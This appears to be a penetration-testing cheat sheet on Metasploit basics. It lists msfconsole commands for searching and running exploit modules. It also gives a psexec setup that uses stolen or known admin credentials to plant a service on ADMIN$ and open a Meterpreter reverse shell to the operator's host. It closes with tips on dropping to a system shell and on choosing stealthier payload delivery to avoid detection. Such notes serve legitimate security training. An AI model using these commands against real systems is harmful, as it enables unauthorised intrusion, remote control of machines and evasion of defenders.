# Automating Payloads — Metasploit Basics

Search for modules by service/vuln, select by number, check options, set required fields, run:

```
sudo msfconsole
msf6 > search smb
msf6 > use <NUMBER>
msf6 exploit(...) > options
msf6 exploit(...) > set RHOSTS <TARGET>
msf6 exploit(...) > set LHOST <LHOST>
msf6 exploit(...) > exploit
```

psexec module — needs valid admin creds, uploads a randomly-named service to ADMIN$, lands Meterpreter:

```
use exploit/windows/smb/psexec
set RHOSTS <TARGET>
set SHARE ADMIN$
set SMBUser <USER>
set SMBPass <PASS>
set LHOST <LHOST>
exploit
```

Default payload is `windows/meterpreter/reverse_tcp` on port 4444 — change LPORT if needed.

Drop from Meterpreter to a full system shell when you need native OS commands:

```
meterpreter > shell
```

> [!tip] `set LHOST` accepts an interface name (e.g. `tun0`) instead of an IP — useful when your VPN IP changes between sessions.

> [!warning] psexec writes a service binary to ADMIN$ — requires writable admin share and valid admin creds. Noisy. Leaves artifacts even though MSF attempts cleanup. Prefer `exploit/multi/handler` + manual payload delivery for stealth.